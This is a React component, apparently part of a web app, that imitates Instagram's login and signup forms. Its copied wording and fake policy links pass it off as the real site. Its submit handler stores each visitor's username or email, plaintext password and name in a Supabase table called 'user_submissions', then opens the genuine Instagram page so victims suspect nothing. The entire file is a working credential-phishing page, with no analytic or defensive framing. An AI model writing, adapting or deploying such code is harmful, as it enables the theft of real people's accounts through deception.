
import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Eye, EyeOff } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';

interface LoginFormProps {
  isLogin: boolean;
}

const LoginForm = ({ isLogin }: LoginFormProps) => {
  const [emailOrUsername, setEmailOrUsername] = useState('');
  const [password, setPassword] = useState('');
  const [username, setUsername] = useState('');
  const [fullName, setFullName] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const { toast } = useToast();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const submissionType = isLogin ? 'login' : 'signup';
      
      const { error } = await supabase
        .from('user_submissions')
        .insert({
          email_or_username: emailOrUsername,
          password: password,
          username: !isLogin ? username : null,
          full_name: !isLogin ? fullName : null,
          submission_type: submissionType
        });

      if (error) {
        console.error('Error storing data:', error);
        toast({
          title: "Error",
          description: "Failed to save data. Please try again.",
          variant: "destructive",
        });
        setLoading(false);
        return;
      }

      toast({
        title: "Data saved",
        description: "Your information has been recorded successfully.",
      });

      setTimeout(() => {
        if (isLogin) {
          window.open('https://www.instagram.com/accounts/login/', '_blank');
        } else {
          window.open('https://www.instagram.com/accounts/emailsignup/', '_blank');
        }
        setLoading(false);
      }, 1000);

    } catch (error) {
      console.error('Unexpected error:', error);
      toast({
        title: "Error",
        description: "Something went wrong. Please try again.",
        variant: "destructive",
      });
      setLoading(false);
    }
  };

  return (
    <div className="w-full max-w-sm mx-auto px-4">
      {!isLogin && (
        <div className="text-center mb-6">
          <p className="text-gray-300 font-semibold text-lg px-8">
            Sign up to see photos and videos from your friends.
          </p>
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-4">
        {!isLogin && (
          <>
            <Input
              type="text"
              placeholder="Full Name"
              value={fullName}
              onChange={(e) => setFullName(e.target.value)}
              className="w-full h-14 px-4 text-base bg-gray-800/50 border border-gray-600 rounded-2xl text-white placeholder-gray-400 focus:border-gray-500 focus:bg-gray-800/70 focus:ring-0 focus:outline-none"
            />
            <Input
              type="text"
              placeholder="Username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full h-14 px-4 text-base bg-gray-800/50 border border-gray-600 rounded-2xl text-white placeholder-gray-400 focus:border-gray-500 focus:bg-gray-800/70 focus:ring-0 focus:outline-none"
            />
          </>
        )}
        
        <Input
          type="text"
          placeholder="Username, email address or mobile numb..."
          value={emailOrUsername}
          onChange={(e) => setEmailOrUsername(e.target.value)}
          className="w-full h-14 px-4 text-base bg-gray-800/50 border border-gray-600 rounded-2xl text-white placeholder-gray-400 focus:border-gray-500 focus:bg-gray-800/70 focus:ring-0 focus:outline-none"
        />
        
        <div className="relative">
          <Input
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full h-14 px-4 pr-12 text-base bg-gray-800/50 border border-gray-600 rounded-2xl text-white placeholder-gray-400 focus:border-gray-500 focus:bg-gray-800/70 focus:ring-0 focus:outline-none"
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-300"
          >
            {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
          </button>
        </div>

        {!isLogin && (
          <div className="text-xs text-gray-500 text-center mt-4 mb-3 px-4">
            <p>
              People who use our service may have uploaded your contact information to Instagram.{' '}
              <a href="#" className="text-blue-400">Learn More</a>
            </p>
            <p className="mt-2">
              By signing up, you agree to our{' '}
              <a href="#" className="text-blue-400">Terms</a>,{' '}
              <a href="#" className="text-blue-400">Privacy Policy</a> and{' '}
              <a href="#" className="text-blue-400">Cookies Policy</a>.
            </p>
          </div>
        )}

        <Button
          type="submit"
          disabled={loading}
          className="w-full h-12 bg-blue-500 hover:bg-blue-600 text-white font-semibold rounded-2xl text-base disabled:opacity-50 mt-6"
        >
          {loading ? 'Saving...' : (isLogin ? 'Log in' : 'Sign up')}
        </Button>
      </form>

      {isLogin && (
        <div className="text-center mt-6">
          <a href="#" className="text-gray-300 text-base">
            Forgotten password?
          </a>
        </div>
      )}
    </div>
  );
};

export default LoginForm;
